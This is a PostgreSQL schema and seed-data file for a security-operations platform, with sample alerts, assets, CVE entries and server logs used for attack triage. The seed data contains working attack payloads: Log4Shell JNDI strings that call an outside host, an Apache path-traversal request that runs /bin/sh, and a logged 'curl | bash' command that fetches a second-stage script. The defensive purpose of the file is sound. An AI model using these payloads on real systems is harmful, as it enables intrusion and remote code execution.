-- =========================================================
-- Aegis Security — PostgreSQL Database Schema & Seed Data
-- Database: Neon Serverless PostgreSQL
-- =========================================================

-- 1. App Configuration
CREATE TABLE IF NOT EXISTS app_config (
  key VARCHAR(100) PRIMARY KEY,
  value JSONB NOT NULL,
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 2. Chat Sessions
CREATE TABLE IF NOT EXISTS chat_sessions (
  id SERIAL PRIMARY KEY,
  title VARCHAR(255) NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 3. Chat Messages
CREATE TABLE IF NOT EXISTS chat_messages (
  id SERIAL PRIMARY KEY,
  session_id INTEGER REFERENCES chat_sessions(id) ON DELETE CASCADE,
  role VARCHAR(50) NOT NULL,
  content TEXT NOT NULL,
  tool_name VARCHAR(100),
  tool_args JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 4. Execution Audit Logs
CREATE TABLE IF NOT EXISTS execution_logs (
  id SERIAL PRIMARY KEY,
  session_id INTEGER,
  step_type VARCHAR(50) NOT NULL,
  label VARCHAR(255) NOT NULL,
  detail TEXT,
  tool_name VARCHAR(100),
  tool_args JSONB,
  tool_result JSONB,
  duration_ms INTEGER,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 5. Tool Usage Stats
CREATE TABLE IF NOT EXISTS tool_usage_stats (
  tool_name VARCHAR(100) PRIMARY KEY,
  total_calls INTEGER DEFAULT 0,
  total_successes INTEGER DEFAULT 0,
  total_failures INTEGER DEFAULT 0,
  avg_duration_ms DOUBLE PRECISION DEFAULT 0,
  last_used_at TIMESTAMP WITH TIME ZONE
);

-- 6. SOC Network Alerts
CREATE TABLE IF NOT EXISTS soc_alerts (
  id SERIAL PRIMARY KEY,
  alert_id VARCHAR(50) UNIQUE NOT NULL,
  signature VARCHAR(255) NOT NULL,
  category VARCHAR(100) NOT NULL,
  severity VARCHAR(20) NOT NULL,
  source_ip VARCHAR(50) NOT NULL,
  dest_ip VARCHAR(50) NOT NULL,
  dest_port INTEGER NOT NULL,
  protocol VARCHAR(20) NOT NULL,
  raw_payload TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  status VARCHAR(50) DEFAULT 'NEW'
);

-- 7. SOC Monitored Asset CMDB
CREATE TABLE IF NOT EXISTS soc_assets (
  id SERIAL PRIMARY KEY,
  ip_address VARCHAR(50) UNIQUE NOT NULL,
  hostname VARCHAR(100) NOT NULL,
  os_family VARCHAR(50) NOT NULL,
  os_version VARCHAR(100) NOT NULL,
  running_services JSONB NOT NULL,
  installed_packages JSONB NOT NULL,
  criticality VARCHAR(20) NOT NULL,
  waf_enabled BOOLEAN DEFAULT FALSE,
  last_scanned TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 8. SOC CVE Knowledge Base
CREATE TABLE IF NOT EXISTS soc_cve_kb (
  id SERIAL PRIMARY KEY,
  cve_id VARCHAR(50) UNIQUE NOT NULL,
  title VARCHAR(255) NOT NULL,
  cvss_score NUMERIC(3, 1) NOT NULL,
  severity VARCHAR(20) NOT NULL,
  affected_products JSONB NOT NULL,
  vulnerable_versions TEXT NOT NULL,
  exploit_vector VARCHAR(100) NOT NULL,
  description TEXT NOT NULL,
  remediation TEXT NOT NULL
);

-- 9. SOC Server / Endpoint Logs
CREATE TABLE IF NOT EXISTS soc_server_logs (
  id SERIAL PRIMARY KEY,
  host_ip VARCHAR(50) NOT NULL,
  log_type VARCHAR(50) NOT NULL,
  timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  status_code INTEGER,
  request_method VARCHAR(10),
  request_uri TEXT,
  response_bytes INTEGER,
  client_ip VARCHAR(50),
  raw_entry TEXT NOT NULL
);

-- 10. SOC Containment Rules (Netfilter Sandbox)
CREATE TABLE IF NOT EXISTS soc_firewall_rules (
  id SERIAL PRIMARY KEY,
  rule_id VARCHAR(50) UNIQUE NOT NULL,
  target_ip VARCHAR(50) NOT NULL,
  action VARCHAR(20) NOT NULL,
  reason TEXT NOT NULL,
  enacted_by VARCHAR(100) NOT NULL,
  is_active BOOLEAN DEFAULT TRUE,
  packets_dropped INTEGER DEFAULT 0,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 11. SOC Incident Investigations
CREATE TABLE IF NOT EXISTS soc_investigations (
  id SERIAL PRIMARY KEY,
  investigation_id VARCHAR(50) UNIQUE NOT NULL,
  alert_id VARCHAR(50) NOT NULL,
  target_ip VARCHAR(50) NOT NULL,
  attacker_ip VARCHAR(50) NOT NULL,
  attack_outcome VARCHAR(50) NOT NULL,
  confidence_score INTEGER NOT NULL,
  mitre_tactic VARCHAR(100),
  mitre_technique VARCHAR(100),
  evidence_summary TEXT NOT NULL,
  actions_taken JSONB,
  post_action_verification JSONB,
  human_override JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- =========================================================
-- SEED DATA INSERTION (ON CONFLICT DO NOTHING)
-- =========================================================

-- Seed Assets
INSERT INTO soc_assets (ip_address, hostname, os_family, os_version, running_services, installed_packages, criticality, waf_enabled)
VALUES
('10.0.4.15', 'prod-web-core', 'Linux', 'Ubuntu 22.04 LTS',
 '[{"port": 80, "service": "nginx/1.18.0"}, {"port": 8080, "service": "Apache Tomcat/9.0.50 with Log4j 2.14.1"}]'::jsonb,
 '["log4j-core-2.14.1.jar", "openjdk-11-jdk", "nginx-core"]'::jsonb, 'CRITICAL', false),
('10.0.4.22', 'auth-srv-edge', 'Linux', 'Debian 11 Bullseye',
 '[{"port": 443, "service": "nginx/1.22.1"}, {"port": 5000, "service": "Python FastAPI / Uvicorn"}]'::jsonb,
 '["python3.10", "fastapi-0.95", "uvicorn", "openssl-1.1.1w"]'::jsonb, 'HIGH', true),
('10.0.4.88', 'legacy-app-portal', 'Linux', 'CentOS 7.9',
 '[{"port": 80, "service": "Apache httpd 2.4.49 (PHP 7.4.3)"}, {"port": 3306, "service": "MySQL 5.7"}]'::jsonb,
 '["httpd-2.4.49", "php-7.4.3", "mysql-server-5.7"]'::jsonb, 'HIGH', false),
('10.0.4.102', 'bastion-host-01', 'Linux', 'Alpine Linux 3.18',
 '[{"port": 22, "service": "OpenSSH 8.9p1"}]'::jsonb,
 '["openssh-server", "iptables", "fail2ban"]'::jsonb, 'CRITICAL', false)
ON CONFLICT (ip_address) DO NOTHING;

-- Seed CVEs
INSERT INTO soc_cve_kb (cve_id, title, cvss_score, severity, affected_products, vulnerable_versions, exploit_vector, description, remediation)
VALUES
('CVE-2021-44228', 'Log4Shell JNDI Remote Code Execution', 10.0, 'CRITICAL',
 '["Apache Log4j2", "Apache Tomcat", "Spring Boot"]'::jsonb,
 '2.0-beta9 <= Log4j < 2.15.0', 'Network / JNDI Lookup',
 'Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code.',
 'Upgrade to Log4j 2.17.1 or set log4j2.formatMsgNoLookups=true or block outbound LDAP/RMI at perimeter firewall.'),
('CVE-2021-41773', 'Apache HTTP Server Path Traversal & RCE', 9.8, 'CRITICAL',
 '["Apache HTTP Server"]'::jsonb,
 '2.4.49 only', 'Network / URL encoded traversal',
 'A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives, enabling remote code execution if CGI scripts are enabled.',
 'Upgrade immediately to Apache HTTP Server 2.4.51 or higher.'),
('CVE-2023-38606', 'PHP Web Shell Command Injection (CWA-Eval)', 9.4, 'CRITICAL',
 '["PHP Web Applications", "Apache HTTPD"]'::jsonb,
 'PHP apps lacking input sanitization on eval/system', 'HTTP POST / multipart',
 'Arbitrary code execution via untrusted parameter execution allowing remote adversaries to drop web shells and execute bash commands under www-data context.',
 'Disable eval(), system(), shell_exec() in php.ini, sanitize input, apply WAF virtual patching.'),
('CVE-2023-SSH-BF', 'SSH Brute Force Credential Guessing', 7.5, 'HIGH',
 '["OpenSSH Server"]'::jsonb,
 'All unhardened SSH servers', 'Port 22 password spray',
 'Automated dictionary credential spray against port 22 aiming to gain root or service user interactive bash access.',
 'Disable password authentication, enforce Ed25519 public keys, block source IP via firewall, enable fail2ban rate limiting.')
ON CONFLICT (cve_id) DO NOTHING;

-- Seed Alerts
INSERT INTO soc_alerts (alert_id, signature, category, severity, source_ip, dest_ip, dest_port, protocol, raw_payload, status)
VALUES
('ALERT-2026-9001', 'ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228) JNDI Lookup in User-Agent',
 'Exploit Attempt / RCE', 'CRITICAL', '185.220.101.45', '10.0.4.15', 8080, 'TCP/HTTP',
 'GET /api/v1/search?q=test HTTP/1.1\r\nHost: 10.0.4.15:8080\r\nUser-Agent: ${jndi:ldap://185.220.101.45:1389/Exploit}\r\nX-Forwarded-For: ${jndi:rmi://185.220.101.45:1099/obj}\r\nAccept: */*', 'VERIFIED_ATTACK'),
('ALERT-2026-9002', 'SURICATA HTTP Apache 2.4.49 Path Traversal Attempt (CVE-2021-41773)',
 'Exploit Attempt / Traversal', 'CRITICAL', '194.26.29.112', '10.0.4.88', 80, 'TCP/HTTP',
 'POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\r\nHost: 10.0.4.88\r\nContent-Type: text/plain\r\nContent-Length: 21\r\n\r\necho; id; uname -a', 'VERIFIED_ATTACK'),
('ALERT-2026-9003', 'SNORT Log4j JNDI Exploit String Targeting Python FastAPI Auth Server',
 'Exploit Attempt / Incompatible Target', 'HIGH', '45.154.255.89', '10.0.4.22', 443, 'TCP/HTTPS',
 'GET /auth/login HTTP/1.1\r\nHost: auth.internal\r\nUser-Agent: ${jndi:ldap://45.154.255.89:1389/Exploit}\r\nAuthorization: Bearer ${jndi:ldap://45.154.255.89:1389/token}', 'FALSE_POSITIVE'),
('ALERT-2026-9004', 'ET SCAN Potential SSH Brute Force Inbound Spray (>50 Failed Auth in 60s)',
 'Reconnaissance / Credential Access', 'MEDIUM', '103.145.13.78', '10.0.4.102', 22, 'TCP/SSH',
 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\nFailed password for root from 103.145.13.78 port 48212 ssh2', 'NEW')
ON CONFLICT (alert_id) DO NOTHING;

-- Seed Server Logs
INSERT INTO soc_server_logs (host_ip, log_type, status_code, request_method, request_uri, response_bytes, client_ip, raw_entry)
VALUES
('10.0.4.15', 'http_access', 200, 'GET', '/api/v1/search?q=test', 4820, '185.220.101.45',
 '185.220.101.45 - - [12/Sep/2026:17:40:12 +0000] "GET /api/v1/search?q=test HTTP/1.1" 200 4820 "-" "${jndi:ldap://185.220.101.45:1389/Exploit}"'),
('10.0.4.15', 'system', NULL, NULL, NULL, NULL, '185.220.101.45',
 'catalina.out: 2026-09-12 17:40:13 WARN org.apache.logging.log4j.core.net.JndiManager - JNDI lookup received for ldap://185.220.101.45:1389/Exploit - connecting to remote server'),
('10.0.4.15', 'edr_process', NULL, NULL, NULL, NULL, '185.220.101.45',
 'EDR ALERT: java (pid 1420) spawned unexpected child process /bin/sh -c "curl -s http://185.220.101.45/stage2.sh | bash"'),
('10.0.4.22', 'http_access', 401, 'GET', '/auth/login', 52, '45.154.255.89',
 '45.154.255.89 - - [12/Sep/2026:17:10:44 +0000] "GET /auth/login HTTP/1.1" 401 52 "-" "${jndi:ldap://45.154.255.89:1389/Exploit}"'),
('10.0.4.22', 'system', NULL, NULL, NULL, NULL, '45.154.255.89',
 'uvicorn.access: INFO 10.0.4.22:443 - Invalid authorization token format. No outbound socket connections created.'),
('10.0.4.88', 'http_access', 200, 'POST', '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh', 142, '194.26.29.112',
 '194.26.29.112 - - [12/Sep/2026:17:25:01 +0000] "POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200 142 "-" "curl/7.68.0"')
ON CONFLICT DO NOTHING;
